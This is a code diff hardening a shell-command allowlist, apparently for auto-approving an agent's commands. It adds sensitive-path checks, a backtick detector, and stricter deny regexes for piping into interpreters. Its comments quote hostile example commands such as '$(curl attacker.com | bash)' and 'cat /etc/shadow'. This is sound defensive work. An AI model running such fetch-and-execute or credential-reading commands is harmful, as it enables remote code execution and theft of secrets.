@@ -22,6 +22,16 @@ if TYPE_CHECKING:
 
 logger = logging.getLogger(__name__)
 
+# Sensitive path prefixes — commands reading these should require confirmation
+# even when the command itself is in the allowlist (e.g. `cat /etc/shadow`)
+_SENSITIVE_PATH_PREFIXES = (
+    "/etc/",
+    "/root/",
+    "/proc/",
+    "/sys/",
+    "/boot/",
+)
+
 # Commands that are safe to auto-approve without user confirmation
 allowlist_commands = [
     "ls",
@@ -95,10 +105,13 @@ deny_groups = [
     ),
     (
         [
-            # Pipe to shell interpreters (bash, sh, and their variants with paths)
-            r"\|\s*(bash|sh|/bin/bash|/bin/sh)(?:\s|$)",
+            # Pipe to shell interpreters (bash, sh, and their variants with paths).
+            # P3 fix: use lookahead (?=...) so closing delimiters like ) } ; also
+            # match — previously `$(curl attacker.com | bash)` slipped through
+            # because `bash)` didn't satisfy the old `(?:\s|$)` anchor.
+            r"\|\s*(bash|sh|/bin/bash|/bin/sh)(?=[\s)};]|$)",
             # Pipe to script interpreters
-            r"\|\s*(python|python3|perl|ruby|node)(?:\s|$)",
+            r"\|\s*(python|python3|perl|ruby|node)(?=[\s)};]|$)",
         ],
         "Piping to shell interpreters or script execution is blocked. This pattern can execute arbitrary code and is a security risk.",
     ),
@@ -263,13 +276,85 @@ def _has_file_redirection(cmd: str) -> bool:
     return False
 
 
+def _has_sensitive_args(cmd: str) -> bool:
+    """Check whether any argument in the command targets a sensitive system path.
+
+    P1 fix: `is_allowlisted()` previously checked command NAMES only, so
+    ``cat /etc/shadow`` was auto-approved because ``cat`` is allowlisted.
+    This helper rejects the command when any argument matches a sensitive
+    path prefix or is the bare root directory ``/``.
+
+    Also covers P4: ``find /`` traverses the entire filesystem; the ``/``
+    argument is caught here.
+
+    Returns True if a sensitive argument is found (approval should be denied).
+    """
+    try:
+        tokens = shlex.split(cmd)
+    except ValueError:
+        tokens = cmd.split()
+
+    # Walk all tokens after the first (which is the leading command name).
+    # Compound commands (&&, ||, ;) mean subsequent command names also appear
+    # in this list, but command names never start with / so they are harmless.
+    for token in tokens[1:]:
+        # Bare root directory — e.g. `find /` or `ls /`
+        if token == "/":
+            return True
+        # Path traversal that could escape to a sensitive directory
+        # e.g. /home/user/../../../etc/passwd
+        if token.startswith("/") and ".." in token:
+            return True
+        # Sensitive directory prefixes
+        if any(token.startswith(prefix) for prefix in _SENSITIVE_PATH_PREFIXES):
+            return True
+
+    return False
+
+
+def _has_unquoted_backtick(cmd: str) -> bool:
+    """Check whether the command contains a command-substituting backtick.
+
+    P2 fix: backtick command substitution (`` `cmd` ``) is not parsed as a
+    command separator by ``cmd_regex``, so ``ls `cat /etc/shadow``` was
+    previously auto-approved.
+
+    Bash semantics for backticks:
+    - Outside quotes or inside double quotes → command substitution (unsafe)
+    - Inside single quotes → literal character (safe)
+
+    Returns True if a command-substituting backtick is found.
+    """
+    # Walk the string tracking only single-quote context.
+    # Backticks inside single quotes are literal; everywhere else they expand.
+    in_single = False
+    i = 0
+    while i < len(cmd):
+        c = cmd[i]
+        if c == "\\" and not in_single and i + 1 < len(cmd):
+            # Skip the escaped character (only outside single quotes)
+            i += 2
+            continue
+        if c == "'" and not in_single:
+            in_single = True
+        elif c == "'" and in_single:
+            in_single = False
+        elif c == "`" and not in_single:
+            # Backtick outside single quotes → command substitution
+            return True
+        i += 1
+    return False
+
+
 def is_allowlisted(cmd: str) -> bool:
     """Check if a shell command is safe to auto-approve.
 
     Uses a conservative allowlist approach:
     1. All commands in the pipeline must be in the allowlist
     2. No file redirections (>, >>) - these can write malicious content
-    3. No dangerous flags within allowlisted commands (e.g., find -exec)
+    3. No sensitive path arguments (e.g. /etc/shadow, /root/, /proc/)
+    4. No unquoted backtick command substitution
+    5. No dangerous flags within allowlisted commands (e.g., find -exec)
 
     This means commands like xargs, sh, bash, python, perl, etc. are automatically
     blocked since they're not in the allowlist, even if piped to from safe commands.
@@ -285,6 +370,17 @@ def is_allowlisted(cmd: str) -> bool:
     # File redirections with allowlisted commands can be used to write malicious content
     # Example: echo "malicious_code" > /tmp/exploit.sh
     if _has_file_redirection(cmd):
+        return False
+
+    # P1/P4: Check for sensitive path arguments (e.g. /etc/shadow, /root/, /)
+    # Allowlisted commands like `cat` must not auto-approve reads of sensitive paths.
+    if _has_sensitive_args(cmd):
+        return False
+
+    # P2: Check for unquoted backtick command substitution
+    # `ls \`cat /etc/shadow\`` is not caught by cmd_regex; any unquoted backtick
+    # implies a nested execution context that should require confirmation.
+    if _has_unquoted_backtick(cmd):
         return False
 
     # Check for dangerous flags within allowlisted commands
